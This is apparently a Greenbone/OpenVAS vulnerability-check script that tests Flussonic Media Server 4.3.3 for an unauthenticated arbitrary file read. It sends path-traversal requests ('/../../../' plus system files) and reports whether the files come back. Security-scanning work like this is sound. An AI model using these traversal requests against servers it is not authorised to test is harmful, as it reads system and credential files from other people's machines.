# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105053");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2025-04-15T05:54:49+0000");
  script_name("Flussonic Media Server Multiple Security Vulnerabilities");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-06-30 17:20:40 +0200 (Mon, 30 Jun 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("cowboy/banner");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jun/167");

  script_tag(name:"impact", value:"It's possible to read any files/directories from the server (with the
  application's user's permissions) by a simple HTTP GET request.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response");

  script_tag(name:"insight", value:"Flussonic Media Server is prone to a:

  1. Arbitrary File Read (Unauthenticated)

  2. Arbitrary Directory Listing (Authenticated)");

  script_tag(name:"solution", value:"Update to Flussonic Media Server 4.3.4");

  script_tag(name:"summary", value:"Flussonic Media Server 4.3.3 Multiple Vulnerabilities");

  script_tag(name:"affected", value:"Flussonic Media Server 4.3.3");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port( default:8080 );
banner = http_get_remote_headers( port:port );
if( "server: cowboy" >!< tolower( banner ) ) exit( 0 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = '/../../../' + file;
  if( buf = http_vuln_check( port:port, url:url, pattern:pattern ) )
  {
    report = http_report_vuln_url( port:port, url:url );
    req_resp = 'Request:\n' + __ka_last_request + '\nResponse:\n' + buf;
    security_message( port:port, data:report, expert_info:req_resp );
    exit(0);
  }
}

exit(99);
